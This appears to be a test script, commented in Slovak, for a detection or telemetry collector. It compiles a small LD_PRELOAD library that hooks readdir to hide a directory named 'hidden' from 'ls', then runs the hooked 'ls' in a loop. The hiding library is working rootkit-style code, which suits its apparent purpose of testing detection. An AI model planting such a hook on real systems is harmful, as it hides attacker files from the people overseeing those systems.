#!/usr/bin/env bash
# hider_run.sh - G1: zbuildi hider.so v hostovi a spusti ho s 'ls' obete.
# Ground truth: subor /tmp/hidden existuje, ale 'LD_PRELOAD=... ls /tmp' ho
# nevidi - zberca ma vidiet aktivitu procesov (hladanie/citanie), ktoru
# pozemna pravda procesov/souborov skryva.
set -uo pipefail
DUR="${DUR:-60}"

command -v gcc >/dev/null || { echo "hider_run: chyba gcc" >&2; exit 2; }
mkdir -p /tmp/hidden /tmp/hider_build
echo "tajny subor" > /tmp/hidden/secret.txt
cat > /tmp/hider_build/hider.c <<'C'
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
typedef struct dirent *(*rd_fn)(DIR *);
struct dirent *readdir(DIR *d) {
    static rd_fn real;
    if (!real) real = (rd_fn)dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real(d)) != NULL) {
        if (!strcmp(e->d_name, "hidden")) continue;
        break;
    }
    return e;
}
C
gcc -shared -fPIC -o /tmp/hider_build/hider.so /tmp/hider_build/hider.c -ldl || exit 2
echo "hider_run: so postavene; viditelne cez 'ls /tmp':"
ls /tmp | tr '\n' ' '; echo
echo "hider_run: s LD_PRELOAD:"
END=$((SECONDS + DUR))
while [ $SECONDS -lt $END ]; do
    LD_PRELOAD=/tmp/hider_build/hider.so ls /tmp >/dev/null 2>&1
    sleep 2
done
echo "hider_run: koniec (${DUR}s)"
